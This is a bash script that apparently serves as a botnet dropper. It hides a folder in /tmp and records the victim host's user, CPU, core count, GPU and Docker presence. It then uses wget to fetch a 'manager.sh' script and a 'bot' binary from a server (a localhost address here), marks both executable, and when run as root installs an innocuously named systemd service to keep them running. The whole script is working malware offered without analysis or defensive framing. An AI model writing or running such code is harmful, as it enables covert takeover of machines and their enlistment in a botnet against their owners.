#!/bin/bash

if [ ! -d /tmp ];then
    mkdir /tmp;
    chmod 777 /tmp;
fi
persistence_folder="/tmp/.folder"
if [ -d "$persistence_folder" ];then
    return
else
    mkdir $persistence_folder
fi

function collect_info(){
    echo $("whoami")>> "$persistence_folder/dvc_info.txt";
    echo $(uname -m)>> "$persistence_folder/dvc_info.txt";
    echo $(cat /proc/cpuinfo | grep "model name"|head -n 1)>> "$persistence_folder/dvc_info.txt";
    echo $(nproc)>> "$persistence_folder/dvc_info.txt";
    echo $(lspci | grep "VGA")>> "$persistence_folder/dvc_info.txt";
}
function check_docker(){
    if which docker &> /dev/null; then
        echo "docker:1">>"$persistence_folder"/conf.txt
    else
        echo "dokcer:0">>"$persistence_folder"/conf.txt
  
    fi

}
function download(){
    url="http://127.0.0.1:8000/"


    arch=$(uname -m)

    if [ "$arch" == "x86_64" ]; then
        wget "$url/manager.sh" -O "$persistence_folder/manager.sh"
        wget "$url/bot" -O "$persistence_folder/bot"
        chmod +x "$persistence_folder/manager.sh"
        chmod +x "$persistence_folder/bot"
        echo "bot:1">>"$persistence_folder/conf.txt"
        echo "manager:1">>"$persistence_folder/conf.txt"

    else 
        exit
    fi

}


function create_service(){
    if [ -d "/etc/systemd/system/my_custom_service.service" ];then
        echo "existed"
    else
        cat <<EOF > "/etc/systemd/system/my_custom_service.service"
[Unit]
Description=My custom service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.folder/manager.sh
Restart=on-abort  

[Install]
WantedBy=multi-user.target

EOF
        systemctl daemon-reload
        systemctl enable my_custom_service.service
        systemctl start my_custom_service.service
    fi

    if [ -d "/etc/systemd/system/my_custom_service.service" ]; then
        echo "service:1">>"$persistence_folder/conf.txt"  
    else
        echo "service:0">>"$persistence_folder/conf.txt"
    fi

}
collect_info
check_docker
download
if [[ $EUID -ne 0 ]]; then
    $persistence_folder/manager.sh

else
    create_service
fi


